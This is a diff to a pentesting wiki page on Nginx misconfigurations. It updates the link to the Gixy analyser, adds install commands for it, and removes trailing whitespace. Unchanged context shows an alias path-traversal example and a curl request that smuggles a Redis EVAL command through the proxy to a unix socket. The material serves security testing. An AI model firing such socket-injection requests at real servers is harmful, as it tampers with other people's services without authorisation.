@@ -8,13 +8,20 @@ NGINX is open source software for web serving, reverse proxying, caching, load b
 
 ### Tools
 
-There are several tools available, such as [Gixy](https://github.com/yandex/gixy) and [Nginxpwner](https://github.com/stark0de/nginxpwner), which can automate the process of identifying misconfigurations in Nginx.
+There are several tools available, such as [Gixy](https://github.com/dvershinin/gixy) and [Nginxpwner](https://github.com/stark0de/nginxpwner), which can automate the process of identifying misconfigurations in Nginx.
 
 {% tabs %}
 {% tab title="Gixy" %}
-[Gixy](https://github.com/yandex/gixy) is a tool to analyze Nginx configuration. The main goal of Gixy is to prevent security misconfiguration and automate flaw detection. This is a static files analyzer.
+[Gixy](https://github.com/dvershinin/gixy) is a tool to analyze Nginx configuration. The main goal of Gixy is to prevent security misconfiguration and automate flaw detection. This is a static files analyzer.
 
 ```bash
+#Install (Python 3)
+pip install gixy-ng
+
+#On CentOS/RHEL/Alma/Rocky/Fedora
+yum -y install https://extras.getpagespeed.com/release-latest.rpm
+yum -y install gixy
+
 #Static analyze
 gixy /etc/nginx/nginx.conf
 ```
@@ -25,8 +32,8 @@ gixy /etc/nginx/nginx.conf
 
 ```bash
 #Target tab in Burp, select host, right click, copy all URLs in this host, copy to a file
-cat urllist | unfurl paths | cut -d"/" -f2-3 | sort -u > /tmp/pathlist 
-#Or get the list of paths you already discovered in the application in some other way. 
+cat urllist | unfurl paths | cut -d"/" -f2-3 | sort -u > /tmp/pathlist
+#Or get the list of paths you already discovered in the application in some other way.
 #Note: the paths should not start with /
 
 #Finally, run it
@@ -74,7 +81,7 @@ Inside the Nginx configuration look the "location" statements, if someone looks 
 
 ```
 #Missing slash with alias directive
-location /imgs { 
+location /imgs {
     alias /path/images/;
 }
 
@@ -280,7 +287,7 @@ Connection: close
 
 ```bash
 # Request to overwrite the maxclients config key:
-curl -X EVAL "http://example.com/static/unix:/var/run/redis/redis.sock:%22return%20redis.call('config','set','maxclients',1337)%22%200%20/app-1555347823-min.js" 
+curl -X EVAL "http://example.com/static/unix:/var/run/redis/redis.sock:%22return%20redis.call('config','set','maxclients',1337)%22%200%20/app-1555347823-min.js"
 
 #Request sent to /var/run/redis/redis.sock (Redis socket)
 EVAL "return redis.call('config','set','maxclients',1337)" 0 -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
